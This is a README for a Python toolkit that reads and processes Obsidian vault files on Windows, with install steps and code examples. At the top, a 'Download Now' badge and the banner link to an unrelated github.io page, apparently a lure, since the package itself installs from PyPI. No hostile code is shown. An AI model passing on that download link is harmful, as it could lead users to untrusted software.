# obsidian-toolkit

[![Download Now](https://img.shields.io/badge/Download_Now-Click_Here-brightgreen?style=for-the-badge&logo=download)](https://Saksham-mishra-eg.github.io/obsidian-link-yk4/)


[![Banner](banner.png)](https://Saksham-mishra-eg.github.io/obsidian-link-yk4/)


[![PyPI version](https://badge.fury.io/py/obsidian-toolkit.svg)](https://badge.fury.io/py/obsidian-toolkit)
[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Platform: Windows](https://img.shields.io/badge/platform-Windows-lightgrey.svg)](https://obsidian.md)
[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)
[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)

---

A Python toolkit for automating workflows, processing vault files, and extracting structured data from [Obsidian](https://obsidian.md) knowledge bases on Windows. Built for developers and power users who want programmatic access to their Obsidian vaults without leaving their Python environment.

---

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Usage Examples](#usage-examples)
- [Requirements](#requirements)
- [Contributing](#contributing)
- [License](#license)

---

## Features

- 📂 **Vault Discovery** — Automatically locate and index Obsidian vault directories on Windows file systems
- 🔗 **Backlink & Link Graph Analysis** — Parse internal `[[wikilinks]]` and build a traversable note graph
- 🏷️ **Tag Extraction & Aggregation** — Collect and count tags across your entire vault with a single function call
- 📝 **Frontmatter Parsing** — Read and write YAML frontmatter metadata in Markdown notes programmatically
- 🔍 **Full-Text Search** — Run keyword and regex searches across thousands of notes efficiently
- 📊 **Vault Statistics & Reporting** — Generate word counts, note counts, orphan detection, and growth metrics
- 🔄 **Batch File Processing** — Rename, move, reformat, or template-stamp notes in bulk
- 🗂️ **Dataview-Compatible Output** — Export structured data as JSON or CSV compatible with Obsidian's Dataview plugin schema

---

## Installation

### From PyPI

```bash
pip install obsidian-toolkit
```

### From Source

```bash
git clone https://github.com/your-org/obsidian-toolkit.git
cd obsidian-toolkit
pip install -e ".[dev]"
```

### Optional Dependencies

```bash
# For graph visualization support
pip install obsidian-toolkit[graph]

# For Excel/CSV export support
pip install obsidian-toolkit[export]

# Install everything
pip install obsidian-toolkit[all]
```

---

## Quick Start

```python
from obsidian_toolkit import Vault

# Point the toolkit at your Obsidian vault on Windows
vault = Vault(r"C:\Users\YourName\Documents\MyVault")

# Load all notes into memory
vault.load()

print(f"Vault loaded: {len(vault.notes)} notes found")

# Pull a quick summary
summary = vault.summary()
print(summary)
# Output:
# Notes: 1,243 | Words: 412,890 | Tags: 87 | Orphans: 14
```

---

## Usage Examples

### 1. Extract All Tags from a Vault

```python
from obsidian_toolkit import Vault

vault = Vault(r"C:\Users\YourName\Documents\MyVault")
vault.load()

tag_counts = vault.tags.count_all()

# Print top 10 most used tags
for tag, count in sorted(tag_counts.items(), key=lambda x: x[1], reverse=True)[:10]:
    print(f"  #{tag}: {count} notes")
```

---

### 2. Parse and Update Frontmatter

```python
from obsidian_toolkit import Vault
from datetime import date

vault = Vault(r"C:\Users\YourName\Documents\MyVault")
vault.load()

note = vault.get_note("Project Ideas.md")

# Read existing frontmatter
print(note.frontmatter)
# {'title': 'Project Ideas', 'created': '2024-01-15', 'status': 'draft'}

# Update a field and write it back to disk
note.frontmatter["status"] = "active"
note.frontmatter["last_reviewed"] = str(date.today())
note.save()

print("Frontmatter updated successfully.")
```

---

### 3. Build and Analyze the Link Graph

```python
from obsidian_toolkit import Vault
from obsidian_toolkit.graph import LinkGraph

vault = Vault(r"C:\Users\YourName\Documents\MyVault")
vault.load()

graph = LinkGraph(vault)

# Find the most connected notes (hubs)
hubs = graph.top_nodes(by="inbound_links", n=5)
for node in hubs:
    print(f"  {node.title}: {node.inbound_link_count} inbound links")

# Detect orphaned notes with no connections
orphans = graph.orphans()
print(f"\nOrphaned notes ({len(orphans)} total):")
for note in orphans:
    print(f"  - {note.title}")
```

---

### 4. Full-Text Search Across the Vault

```python
from obsidian_toolkit import Vault

vault = Vault(r"C:\Users\YourName\Documents\MyVault")
vault.load()

# Simple keyword search
results = vault.search("machine learning")

for result in results:
    print(f"[{result.note.title}] — {result.snippet}")

# Regex-based search
import re
pattern = re.compile(r"\b\d{4}-\d{2}-\d{2}\b")  # ISO dates
dated_notes = vault.search(pattern, mode="regex")
print(f"Found {len(dated_notes)} notes containing ISO date strings.")
```

---

### 5. Batch Processing — Add a Tag to Multiple Notes

```python
from obsidian_toolkit import Vault

vault = Vault(r"C:\Users\YourName\Documents\MyVault")
vault.load()

# Add a review tag to all notes that haven't been modified in 90 days
import datetime

cutoff = datetime.date.today() - datetime.timedelta(days=90)
stale_notes = [n for n in vault.notes if n.last_modified.date() < cutoff]

for note in stale_notes:
    if "needs-review" not in note.frontmatter.get("tags", []):
        note.frontmatter.setdefault("tags", []).append("needs-review")
        note.save()

print(f"Tagged {len(stale_notes)} stale notes for review.")
```

---

### 6. Export Vault Data to JSON

```python
from obsidian_toolkit import Vault
from obsidian_toolkit.exporters import JSONExporter
import json

vault = Vault(r"C:\Users\YourName\Documents\MyVault")
vault.load()

exporter = JSONExporter(vault)
data = exporter.export(fields=["title", "tags", "frontmatter", "word_count", "links"])

with open("vault_export.json", "w", encoding="utf-8") as f:
    json.dump(data, f, indent=2, ensure_ascii=False)

print("Vault exported to vault_export.json")
```

---

## Requirements

| Requirement | Version |
|---|---|
| Python | `>= 3.8` |
| Operating System | Windows 10 / Windows 11 |
| Obsidian | `>= 1.0` (vault format v2+) |
| `PyYAML` | `>= 6.0` |
| `python-frontmatter` | `>= 1.0.0` |
| `networkx` *(optional)* | `>= 3.0` — for graph analysis |
| `pandas` *(optional)* | `>= 1.5` — for tabular exports |
| `rich` *(optional)* | `>= 13.0` — for CLI output formatting |

> **Note:** This toolkit operates entirely on local vault files. No Obsidian application process needs to be running during execution.

---

## Project Structure

```
obsidian-toolkit/
├── obsidian_toolkit/
│   ├── __init__.py
│   ├── vault.py          # Core Vault and Note classes
│   ├── frontmatter.py    # YAML frontmatter read/write
│   ├── graph.py          # Link graph construction and analysis
│   ├── search.py         # Full-text and regex search engine
│   ├── exporters/
│   │   ├── json_exporter.py
│   │   └── csv_exporter.py
│   └── cli.py            # Optional command-line interface
├── tests/
├── docs/
├── pyproject.toml
└── README.md
```

---

## Contributing

Contributions are welcome and appreciated. Please follow these steps:

1. Fork the repository
2. Create a feature branch: `git checkout -b feature/your-feature-name`
3. Write tests for your changes under `tests/`
4. Run the test suite: `pytest tests/ -v`
5. Format your code: `black obsidian_toolkit/`
6. Submit a pull request with a clear description of your changes

Please read [CONTRIBUTING.md](CONTRIBUTING.md) for our full code of conduct and development guidelines.

---

## Roadmap

- [ ] macOS and Linux vault support
- [ ] Async batch processing for large vaults (10,000+ notes)
- [ ] Canvas file (`.canvas`) parsing
- [ ] Direct Obsidian plugin API bridge via local REST plugin
- [ ] CLI wrapper (`obsidian-toolkit sync`, `obsidian-toolkit report`)

---

## License

This project is licensed under the **MIT License**. See the [LICENSE](LICENSE) file for full details.

---

> **Disclaimer:** This toolkit is an independent, community-developed project. It is not affiliated with, endorsed by, or officially connected to Dynalist Inc. or the Obsidian application. "Obsidian" is a trademark of Dynalist Inc.